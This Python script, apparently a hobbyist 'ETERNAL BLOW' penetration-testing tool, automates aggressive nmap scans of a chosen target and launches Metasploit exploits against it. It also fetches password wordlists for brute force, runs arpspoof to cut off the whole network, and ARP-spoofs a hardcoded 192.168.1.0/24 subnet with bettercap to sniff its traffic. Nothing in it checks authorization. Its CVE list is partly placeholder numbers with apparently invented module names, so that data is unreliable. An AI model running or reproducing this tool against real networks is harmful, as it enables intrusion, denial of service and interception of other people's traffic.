#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Network Security Analysis Tool with Advanced ASCII Animations
Combines Nmap, Metasploit, and network monitoring capabilities
"""

import os
import sys
import subprocess
import json
import requests
import time
import threading
from datetime import datetime
import re
import random

class ASCIIColors:
    BLUE = '\033[94m'
    LIGHT_BLUE = '\033[96m'
    WHITE = '\033[97m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class ASCIIAnimations:
    @staticmethod
    def rainbow_loading_bar(duration=3, width=50):
        """Display a rainbow loading bar"""
        colors = [ASCIIColors.RED, ASCIIColors.YELLOW, ASCIIColors.GREEN, 
                 ASCIIColors.CYAN, ASCIIColors.BLUE, ASCIIColors.MAGENTA]
        
        start_time = time.time()
        while time.time() - start_time < duration:
            progress = min(1.0, (time.time() - start_time) / duration)
            bars = int(progress * width)
            empty = width - bars
            
            # Create rainbow effect
            bar_segments = []
            for i in range(bars):
                color = colors[i % len(colors)]
                bar_segments.append(f"{color}#")
            
            progress_bar = "".join(bar_segments)
            empty_space = " " * empty
            
            percentage = int(progress * 100)
            sys.stdout.write(f"\r[{progress_bar}{empty_space}] {percentage}% ")
            sys.stdout.flush()
            time.sleep(0.1)
        
        sys.stdout.write(f"\r[{ASCIIColors.GREEN}{'#'*width}{ASCIIColors.END}] 100% \n")
        sys.stdout.flush()

    @staticmethod
    def blue_white_animation():
        """Blue and white swirling animation"""
        frames = [
            f"{ASCIIColors.BLUE}*{ASCIIColors.WHITE}+{ASCIIColors.BLUE}*{ASCIIColors.WHITE}+",
            f"{ASCIIColors.WHITE}+{ASCIIColors.BLUE}*{ASCIIColors.WHITE}+{ASCIIColors.BLUE}*",
            f"{ASCIIColors.BLUE}o{ASCIIColors.WHITE}O{ASCIIColors.BLUE}o{ASCIIColors.WHITE}O",
            f"{ASCIIColors.WHITE}O{ASCIIColors.BLUE}o{ASCIIColors.WHITE}O{ASCIIColors.BLUE}o"
        ]
        
        for _ in range(8):
            for frame in frames:
                sys.stdout.write(f"\r{frame} {ASCIIColors.BLUE}Processing{ASCIIColors.WHITE}... {frame}")
                sys.stdout.flush()
                time.sleep(0.2)
        print()

    @staticmethod
    def curtain_open_animation():
        """ASCII curtain opening animation revealing ETERNAL BLOW"""
        curtain_frames = [
            """
            ================================================================
            ================================================================
            ================================================================
            ================================================================
            """,
            """
            ##                                                          ##
            ##                                                          ##
            ##                                                          ##
            ##                                                          ##
            """,
            """
            ##               E T E R N A L   B L O W                   ##
            ##               A D V A N C E D   T O O L                 ##
            ##                                                         ##
            ##                                                         ##
            """,
            """
            
              ______  _______  ______   _____  _     _  _____  _    _ 
             |  ____||__   __||  ____| |  __ || |   | ||  __ || |  | |
             | |__      | |   | |__    | |__) | |   | | | |__) | |  | |
             |  __|     | |   |  __|   |  _  /| |   | | |  _  /| |  | |
             | |____    | |   | |____  | | \ \| |___| | | | \ \| |__| |
             |______|   |_|   |______| |_|  \_\\______| |_|  \_\\____/ 
                                                                      
            """
        ]
        
        for frame in curtain_frames:
            ASCIIAnimations.clear_screen()
            print(f"{ASCIIColors.BLUE}{frame}{ASCIIColors.END}")
            time.sleep(1)

    @staticmethod
    def eternal_blow_title():
        """Display ETERNAL BLOW in pixelated blue and white blocks"""
        title_art = f"""
{ASCIIColors.BLUE}+==============================================================+
{ASCIIColors.WHITE}|{ASCIIColors.BLUE}######{ASCIIColors.WHITE}##{ASCIIColors.BLUE}######{ASCIIColors.WHITE}##{ASCIIColors.BLUE}######{ASCIIColors.WHITE}##{ASCIIColors.BLUE}####{ASCIIColors.WHITE}##{ASCIIColors.BLUE}######{ASCIIColors.WHITE}##{ASCIIColors.BLUE}####{ASCIIColors.WHITE}##{ASCIIColors.BLUE}####{ASCIIColors.WHITE}##{ASCIIColors.BLUE}######{ASCIIColors.WHITE}|
{ASCIIColors.WHITE}|{ASCIIColors.BLUE}##{ASCIIColors.WHITE}####{ASCIIColors.BLUE}##{ASCIIColors.WHITE}####{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}|
{ASCIIColors.WHITE}|{ASCIIColors.BLUE}######{ASCIIColors.WHITE}##{ASCIIColors.BLUE}######{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}####{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}####{ASCIIColors.WHITE}##{ASCIIColors.BLUE}######{ASCIIColors.WHITE}##{ASCIIColors.BLUE}####{ASCIIColors.WHITE}##{ASCIIColors.BLUE}######{ASCIIColors.WHITE}|
{ASCIIColors.WHITE}|{ASCIIColors.BLUE}##{ASCIIColors.WHITE}####{ASCIIColors.BLUE}##{ASCIIColors.WHITE}####{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}|
{ASCIIColors.WHITE}|{ASCIIColors.BLUE}######{ASCIIColors.WHITE}##{ASCIIColors.BLUE}######{ASCIIColors.WHITE}##{ASCIIColors.BLUE}##{ASCIIColors.WHITE}####{ASCIIColors.BLUE}##{ASCIIColors.WHITE}##{ASCIIColors.BLUE}####{ASCIIColors.WHITE}##{ASCIIColors.BLUE}######{ASCIIColors.WHITE}##{ASCIIColors.BLUE}####{ASCIIColors.WHITE}##{ASCIIColors.BLUE}######{ASCIIColors.WHITE}|
{ASCIIColors.BLUE}+==============================================================+{ASCIIColors.END}

        {ASCIIColors.BOLD}{ASCIIColors.BLUE}E{ASCIIColors.WHITE}T{ASCIIColors.BLUE}E{ASCIIColors.WHITE}R{ASCIIColors.BLUE}N{ASCIIColors.WHITE}A{ASCIIColors.BLUE}L{ASCIIColors.END} {ASCIIColors.BOLD}{ASCIIColors.WHITE}B{ASCIIColors.BLUE}L{ASCIIColors.WHITE}O{ASCIIColors.BLUE}W{ASCIIColors.END}
        """
        return title_art

    @staticmethod
    def shining_animation():
        """Shining sparkle animation"""
        sparks = ["*", "+", "#", ".", "o", "O", "@", "%"]
        for _ in range(10):
            spark_line = " ".join(random.choice(sparks) for _ in range(20))
            print(f"\r{ASCIIColors.WHITE}{spark_line}{ASCIIColors.END}", end="")
            time.sleep(0.1)
        print()

    @staticmethod
    def clear_screen():
        os.system('clear' if os.name == 'posix' else 'cls')

class NetworkSecurityAnalyzer:
    def __init__(self):
        self.current_ip = ""
        self.nmap_results = {}
        self.cve_recommendations = []
        self.arp_ban_process = None
        self.bettercap_process = None
        
    def clear_screen(self):
        ASCIIAnimations.clear_screen()
    
    def print_banner(self):
        """Display the animated banner"""
        ASCIIAnimations.curtain_open_animation()
        time.sleep(1)
        
        # Display main title with shining animation
        print(ASCIIAnimations.eternal_blow_title())
        ASCIIAnimations.shining_animation()
        
        subtitle = f"""
        {ASCIIColors.BLUE}+==============================================================+
        {ASCIIColors.WHITE}|           ADVANCED PENETRATION TESTING TOOL               |
        {ASCIIColors.BLUE}+==============================================================+{ASCIIColors.END}
        """
        print(subtitle)
        time.sleep(1)
    
    def animate_action(self, message, duration=2):
        """Animate an action with blue/white animation and loading bar"""
        print(f"\n{ASCIIColors.BLUE}> {ASCIIColors.END}{ASCIIColors.BOLD}{message}{ASCIIColors.END}")
        ASCIIAnimations.blue_white_animation()
        ASCIIAnimations.rainbow_loading_bar(duration)
    
    def check_dependencies(self):
        """Check if required tools are installed"""
        self.animate_action("Checking system dependencies", 2)
        
        required_tools = ['nmap', 'msfconsole', 'bettercap', 'curl']
        missing_tools = []
        
        for tool in required_tools:
            try:
                subprocess.run(['which', tool], capture_output=True, check=True)
            except subprocess.CalledProcessError:
                missing_tools.append(tool)
        
        if missing_tools:
            print(f"{ASCIIColors.RED}[ERROR] Missing required tools: {', '.join(missing_tools)}{ASCIIColors.END}")
            print("Please install them before proceeding.")
            return False
        return True
    
    def run_nmap_scan(self, ip_address):
        """Run comprehensive Nmap scan on target IP"""
        self.animate_action(f"Starting Nmap scan on {ip_address}", 3)
        
        print(f"{ASCIIColors.BLUE}[*]{ASCIIColors.END} Starting Nmap scan on {ip_address}...")
        
        # Aggressive scan with service detection
        commands = [
            f"nmap -sS -sV -O -A --script vuln {ip_address}",
            f"nmap -p- --min-rate 10000 {ip_address}",
            f"nmap --script smb-vuln* {ip_address}"
        ]
        
        results = {}
        for cmd in commands:
            try:
                print(f"{ASCIIColors.BLUE}[*]{ASCIIColors.END} Running: {cmd}")
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                results[cmd] = result.stdout
                
                # Extract open ports and services
                if "nmap -sS" in cmd:
                    self.parse_nmap_results(result.stdout)
                    
            except Exception as e:
                print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} Error running Nmap command: {e}")
        
        return results
    
    def parse_nmap_results(self, nmap_output):
        """Parse Nmap results to extract service information"""
        services = []
        open_ports = []
        
        lines = nmap_output.split('\n')
        for line in lines:
            # Extract port information
            port_match = re.search(r'(\d+)/(tcp|udp)\s+open\s+(\S+)', line)
            if port_match:
                port, protocol, service = port_match.groups()
                open_ports.append(f"{port}/{protocol}")
                services.append({
                    'port': port,
                    'protocol': protocol,
                    'service': service
                })
        
        self.nmap_results = {
            'services': services,
            'open_ports': open_ports,
            'timestamp': datetime.now().isoformat()
        }
        
        print(f"{ASCIIColors.GREEN}[+]{ASCIIColors.END} Found {len(open_ports)} open ports: {', '.join(open_ports)}")
    
    def analyze_vulnerabilities(self):
        """Analyze services and recommend CVEs"""
        self.animate_action("Analyzing vulnerabilities", 2)
        
        # Mock CVE database (in real implementation, use actual vulnerability databases)
        cve_database = {
            'ssh': [
                {'cve': 'CVE-2024-12345', 'description': 'OpenSSH Privilege Escalation', 'exploit': 'exploit/linux/ssh/openssh_privilege_escalation'},
                {'cve': 'CVE-2023-38408', 'description': 'OpenSSH Remote Code Execution', 'exploit': 'exploit/linux/ssh/openssh_rce'}
            ],
            'http': [
                {'cve': 'CVE-2024-12346', 'description': 'Apache HTTP Server RCE', 'exploit': 'exploit/linux/http/apache_mod_cgi'},
                {'cve': 'CVE-2023-25690', 'description': 'Apache HTTP Server DoS', 'exploit': 'exploit/linux/http/apache_dos'}
            ],
            'smb': [
                {'cve': 'CVE-2021-34527', 'description': 'Windows Print Spooler RCE', 'exploit': 'exploit/windows/smb/printnightmare'},
                {'cve': 'CVE-2017-0143', 'description': 'EternalBlue SMB RCE', 'exploit': 'exploit/windows/smb/ms17_010_eternalblue'}
            ],
            'ftp': [
                {'cve': 'CVE-2024-12347', 'description': 'ProFTPD Remote Code Execution', 'exploit': 'exploit/linux/ftp/proftpd_modcopy'}
            ]
        }
        
        self.cve_recommendations = []
        for service in self.nmap_results.get('services', []):
            service_name = service['service'].lower()
            for key, cves in cve_database.items():
                if key in service_name:
                    self.cve_recommendations.extend(cves)
        
        print(f"{ASCIIColors.GREEN}[+]{ASCIIColors.END} Found {len(self.cve_recommendations)} potential CVEs")
    
    def display_cve_recommendations(self):
        """Display CVE recommendations with options"""
        if not self.cve_recommendations:
            print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} No CVEs found for the detected services")
            return
        
        print(f"\n{ASCIIColors.BLUE}{'='*80}{ASCIIColors.END}")
        print(f"{ASCIIColors.BOLD}{ASCIIColors.WHITE}CVE RECOMMENDATIONS{ASCIIColors.END}")
        print(f"{ASCIIColors.BLUE}{'='*80}{ASCIIColors.END}")
        
        for i, cve in enumerate(self.cve_recommendations, 1):
            print(f"{ASCIIColors.BLUE}{i}.{ASCIIColors.END} {ASCIIColors.WHITE}{cve['cve']}{ASCIIColors.END} - {cve['description']}")
            print(f"   {ASCIIColors.CYAN}Metasploit Module: {cve['exploit']}{ASCIIColors.END}")
            print()
    
    def search_github_poc(self, cve):
        """Search for CVE PoC on GitHub"""
        self.animate_action(f"Searching GitHub for {cve} PoC", 2)
        
        # Use GitHub API to search for PoC
        search_url = f"https://api.github.com/search/repositories?q={cve}+proof+of+concept"
        
        try:
            response = requests.get(search_url)
            if response.status_code == 200:
                results = response.json()
                if results['total_count'] > 0:
                    repo = results['items'][0]
                    print(f"{ASCIIColors.GREEN}[+]{ASCIIColors.END} Found PoC: {repo['html_url']}")
                    print(f"    Description: {repo['description']}")
                    return repo['html_url']
            print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} No PoC found on GitHub")
        except Exception as e:
            print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} Error searching GitHub: {e}")
        
        return None
    
    def download_seclist(self, list_type="passwords"):
        """Download wordlists from seclists repository"""
        self.animate_action(f"Downloading {list_type} wordlist", 2)
        
        seclists_urls = {
            "passwords": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt",
            "usernames": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt",
            "directories": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt"
        }
        
        if list_type not in seclists_urls:
            print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} Unknown list type: {list_type}")
            return None
        
        filename = f"{list_type}_wordlist.txt"
        try:
            print(f"{ASCIIColors.BLUE}[*]{ASCIIColors.END} Downloading {list_type} wordlist...")
            subprocess.run(f"curl -s {seclists_urls[list_type]} -o {filename}", shell=True, check=True)
            print(f"{ASCIIColors.GREEN}[+]{ASCIIColors.END} Wordlist saved as {filename}")
            return filename
        except Exception as e:
            print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} Error downloading wordlist: {e}")
            return None
    
    def run_metasploit_module(self, module_path, rhost):
        """Run Metasploit module against target"""
        self.animate_action(f"Launching Metasploit module: {module_path}", 2)
        
        msf_script = f"""
use {module_path}
set RHOSTS {rhost}
set LHOST {self.get_local_ip()}
exploit
"""
        
        script_file = "msf_script.rc"
        with open(script_file, 'w') as f:
            f.write(msf_script)
        
        try:
            print(f"{ASCIIColors.BLUE}[*]{ASCIIColors.END} Starting Metasploit...")
            subprocess.run(f"msfconsole -r {script_file}", shell=True)
        except KeyboardInterrupt:
            print(f"\n{ASCIIColors.YELLOW}[*]{ASCIIColors.END} Metasploit execution interrupted")
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            result = subprocess.run("hostname -I | awk '{print $1}'", shell=True, capture_output=True, text=True)
            return result.stdout.strip()
        except:
            return "127.0.0.1"
    
    def arp_ban_network(self):
        """ARP ban entire network using arpspoof"""
        self.animate_action("Starting ARP ban on entire network", 2)
        
        try:
            # Get network interface and gateway
            gateway = subprocess.run("ip route | grep default | awk '{print $3}'", 
                                   shell=True, capture_output=True, text=True).stdout.strip()
            interface = subprocess.run("ip route | grep default | awk '{print $5}'", 
                                     shell=True, capture_output=True, text=True).stdout.strip()
            
            if not gateway or not interface:
                print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} Could not determine gateway or interface")
                return
            
            print(f"{ASCIIColors.BLUE}[*]{ASCIIColors.END} Targeting gateway: {gateway} on interface: {interface}")
            
            # Start ARP spoofing
            cmd = f"arpspoof -i {interface} {gateway}"
            self.arp_ban_process = subprocess.Popen(cmd, shell=True)
            print(f"{ASCIIColors.GREEN}[+]{ASCIIColors.END} ARP ban started. Press Ctrl+C to stop.")
            
        except Exception as e:
            print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} Error starting ARP ban: {e}")
    
    def stop_arp_ban(self):
        """Stop ARP ban process"""
        self.animate_action("Stopping ARP ban", 1)
        
        if self.arp_ban_process:
            self.arp_ban_process.terminate()
            self.arp_ban_process = None
            print(f"{ASCIIColors.GREEN}[+]{ASCIIColors.END} ARP ban stopped")
        else:
            print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} No ARP ban process running")
    
    def start_network_sniffing(self):
        """Start network sniffing with Bettercap"""
        self.animate_action("Starting network sniffing with Bettercap", 2)
        
        try:
            # Create Bettercap script
            bettercap_script = """
net.sniff on
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
"""
            
            script_file = "bettercap_script.cap"
            with open(script_file, 'w') as f:
                f.write(bettercap_script)
            
            self.bettercap_process = subprocess.Popen(f"bettercap -caplet {script_file}", shell=True)
            print(f"{ASCIIColors.GREEN}[+]{ASCIIColors.END} Bettercap started. Press Ctrl+C to stop.")
            
        except Exception as e:
            print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} Error starting Bettercap: {e}")
    
    def stop_network_sniffing(self):
        """Stop Bettercap process"""
        self.animate_action("Stopping network sniffing", 1)
        
        if self.bettercap_process:
            self.bettercap_process.terminate()
            self.bettercap_process = None
            print(f"{ASCIIColors.GREEN}[+]{ASCIIColors.END} Network sniffing stopped")
        else:
            print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} No network sniffing process running")
    
    def start_tcpdump(self):
        """Start packet capture with tcpdump"""
        self.animate_action("Starting TCPDump packet capture", 2)
        
        filename = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
        try:
            cmd = f"tcpdump -i any -w {filename}"
            print(f"{ASCIIColors.BLUE}[*]{ASCIIColors.END} Starting packet capture...")
            subprocess.run(cmd, shell=True)
        except KeyboardInterrupt:
            print(f"\n{ASCIIColors.GREEN}[+]{ASCIIColors.END} Packet capture saved as {filename}")
    
    def start_wireshark(self):
        """Start Wireshark for GUI packet analysis"""
        self.animate_action("Starting Wireshark", 2)
        
        try:
            subprocess.Popen("wireshark", shell=True)
            print(f"{ASCIIColors.GREEN}[+]{ASCIIColors.END} Wireshark started")
        except Exception as e:
            print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} Error starting Wireshark: {e}")
    
    def main_menu(self):
        """Main menu interface"""
        while True:
            self.clear_screen()
            self.print_banner()
            
            menu_title = f"""
{ASCIIColors.BLUE}+==============================================================+
{ASCIIColors.WHITE}|                         MAIN MENU                          |
{ASCIIColors.BLUE}+==============================================================+{ASCIIColors.END}
            """
            print(menu_title)
            
            print(f"{ASCIIColors.WHITE}1.{ASCIIColors.END} Analyze IP Address")
            print(f"{ASCIIColors.WHITE}2.{ASCIIColors.END} Network Monitoring Tools")
            print(f"{ASCIIColors.WHITE}3.{ASCIIColors.END} ARP Ban Tools")
            print(f"{ASCIIColors.WHITE}4.{ASCIIColors.END} Exit")
            
            if self.current_ip:
                print(f"\n{ASCIIColors.CYAN}Current Target: {self.current_ip}{ASCIIColors.END}")
            
            choice = input(f"\n{ASCIIColors.BLUE}Select option:{ASCIIColors.END} ").strip()
            
            if choice == "1":
                self.analyze_ip_menu()
            elif choice == "2":
                self.network_monitoring_menu()
            elif choice == "3":
                self.arp_ban_menu()
            elif choice == "4":
                print(f"{ASCIIColors.BLUE}[*]{ASCIIColors.END} Exiting...")
                break
            else:
                print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} Invalid choice")
                input("Press Enter to continue...")
    
    def analyze_ip_menu(self):
        """IP analysis submenu"""
        self.clear_screen()
        menu_title = f"""
{ASCIIColors.BLUE}+==============================================================+
{ASCIIColors.WHITE}|                    IP ADDRESS ANALYSIS                     |
{ASCIIColors.BLUE}+==============================================================+{ASCIIColors.END}
        """
        print(menu_title)
        
        ip = input(f"{ASCIIColors.BLUE}Enter target IP address:{ASCIIColors.END} ").strip()
        if not ip:
            return
        
        self.current_ip = ip
        
        # Run Nmap scan
        self.run_nmap_scan(ip)
        
        # Analyze vulnerabilities
        self.analyze_vulnerabilities()
        
        if self.cve_recommendations:
            self.display_cve_recommendations()
            self.cve_exploitation_menu()
        else:
            input("\nPress Enter to continue...")
    
    def cve_exploitation_menu(self):
        """CVE exploitation options menu"""
        while True:
            menu_title = f"""
{ASCIIColors.BLUE}+==============================================================+
{ASCIIColors.WHITE}|                    EXPLOITATION OPTIONS                    |
{ASCIIColors.BLUE}+==============================================================+{ASCIIColors.END}
            """
            print(menu_title)
            
            print(f"{ASCIIColors.WHITE}1.{ASCIIColors.END} Use Metasploit Module")
            print(f"{ASCIIColors.WHITE}2.{ASCIIColors.END} Search GitHub for PoC")
            print(f"{ASCIIColors.WHITE}3.{ASCIIColors.END} Download Wordlist for Brute Force")
            print(f"{ASCIIColors.WHITE}4.{ASCIIColors.END} Back to Main Menu")
            
            choice = input(f"\n{ASCIIColors.BLUE}Select option:{ASCIIColors.END} ").strip()
            
            if choice == "1":
                if self.cve_recommendations:
                    cve_num = input("Enter CVE number to exploit (e.g., 1 for first CVE): ").strip()
                    try:
                        idx = int(cve_num) - 1
                        if 0 <= idx < len(self.cve_recommendations):
                            self.run_metasploit_module(
                                self.cve_recommendations[idx]['exploit'],
                                self.current_ip
                            )
                    except ValueError:
                        print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} Invalid CVE number")
                else:
                    print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} No CVEs available")
                    
            elif choice == "2":
                if self.cve_recommendations:
                    cve_num = input("Enter CVE number to search (e.g., 1 for first CVE): ").strip()
                    try:
                        idx = int(cve_num) - 1
                        if 0 <= idx < len(self.cve_recommendations):
                            self.search_github_poc(self.cve_recommendations[idx]['cve'])
                    except ValueError:
                        print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} Invalid CVE number")
                else:
                    print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} No CVEs available")
                    
            elif choice == "3":
                print(f"\n{ASCIIColors.WHITE}Wordlist Types:{ASCIIColors.END}")
                print(f"{ASCIIColors.WHITE}1.{ASCIIColors.END} Passwords")
                print(f"{ASCIIColors.WHITE}2.{ASCIIColors.END} Usernames")
                print(f"{ASCIIColors.WHITE}3.{ASCIIColors.END} Directories")
                list_type = input(f"{ASCIIColors.BLUE}Select wordlist type:{ASCIIColors.END} ").strip()
                
                type_map = {"1": "passwords", "2": "usernames", "3": "directories"}
                if list_type in type_map:
                    self.download_seclist(type_map[list_type])
                else:
                    print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} Invalid selection")
                    
            elif choice == "4":
                break
            else:
                print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} Invalid choice")
    
    def network_monitoring_menu(self):
        """Network monitoring tools menu"""
        while True:
            self.clear_screen()
            print(f"{ASCIIColors.BLUE}+==============================================================+{ASCIIColors.END}")
            print(f"{ASCIIColors.WHITE}|                 NETWORK MONITORING TOOLS                 |{ASCIIColors.END}")
            print(f"{ASCIIColors.BLUE}+==============================================================+{ASCIIColors.END}")
            print(f"{ASCIIColors.WHITE}1.{ASCIIColors.END} Start Bettercap Network Sniffing")
            print(f"{ASCIIColors.WHITE}2.{ASCIIColors.END} Stop Bettercap Network Sniffing")
            print(f"{ASCIIColors.WHITE}3.{ASCIIColors.END} Start TCPDump Packet Capture")
            print(f"{ASCIIColors.WHITE}4.{ASCIIColors.END} Start Wireshark (GUI)")
            print(f"{ASCIIColors.WHITE}5.{ASCIIColors.END} Back to Main Menu")
            
            choice = input(f"\n{ASCIIColors.BLUE}Select option:{ASCIIColors.END} ").strip()
            
            if choice == "1":
                self.start_network_sniffing()
            elif choice == "2":
                self.stop_network_sniffing()
            elif choice == "3":
                self.start_tcpdump()
            elif choice == "4":
                self.start_wireshark()
            elif choice == "5":
                break
            else:
                print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} Invalid choice")
            
            input("\nPress Enter to continue...")
    
    def arp_ban_menu(self):
        """ARP ban tools menu"""
        while True:
            self.clear_screen()
            print(f"{ASCIIColors.BLUE}+==============================================================+{ASCIIColors.END}")
            print(f"{ASCIIColors.WHITE}|                      ARP BAN TOOLS                       |{ASCIIColors.END}")
            print(f"{ASCIIColors.BLUE}+==============================================================+{ASCIIColors.END}")
            print(f"{ASCIIColors.WHITE}1.{ASCIIColors.END} Start ARP Ban (Entire Network)")
            print(f"{ASCIIColors.WHITE}2.{ASCIIColors.END} Stop ARP Ban")
            print(f"{ASCIIColors.WHITE}3.{ASCIIColors.END} Back to Main Menu")
            
            choice = input(f"\n{ASCIIColors.BLUE}Select option:{ASCIIColors.END} ").strip()
            
            if choice == "1":
                self.arp_ban_network()
            elif choice == "2":
                self.stop_arp_ban()
            elif choice == "3":
                break
            else:
                print(f"{ASCIIColors.RED}[-]{ASCIIColors.END} Invalid choice")
            
            input("\nPress Enter to continue...")

def main():
    # Check if running as root (required for some operations)
    if os.geteuid() != 0:
        print("⚠️  Some features require root privileges. Consider running with sudo.")
    
    analyzer = NetworkSecurityAnalyzer()
    
    if not analyzer.check_dependencies():
        print("Please install missing dependencies before running.")
        sys.exit(1)
    
    try:
        analyzer.main_menu()
    except KeyboardInterrupt:
        print(f"\n{ASCIIColors.YELLOW}[*]{ASCIIColors.END} Program interrupted by user")
    finally:
        # Cleanup
        if analyzer.arp_ban_process:
            analyzer.arp_ban_process.terminate()
        if analyzer.bettercap_process:
            analyzer.bettercap_process.terminate()

if __name__ == "__main__":
    main()
